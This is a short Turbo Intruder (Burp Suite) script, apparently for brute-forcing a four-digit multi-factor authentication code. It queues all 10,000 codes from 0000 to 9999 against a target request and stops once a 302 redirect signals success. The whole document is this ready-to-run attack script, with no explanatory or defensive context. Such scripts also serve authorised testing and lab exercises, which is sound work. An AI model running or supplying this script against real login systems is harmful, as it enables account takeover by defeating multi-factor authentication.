def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    for num in range(0,10000):       
       mfa_code = '{0:04}'.format(num)
       engine.queue(target.req, mfa_code.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
        if req.status == 302:
            req.engine.engine.cancel()
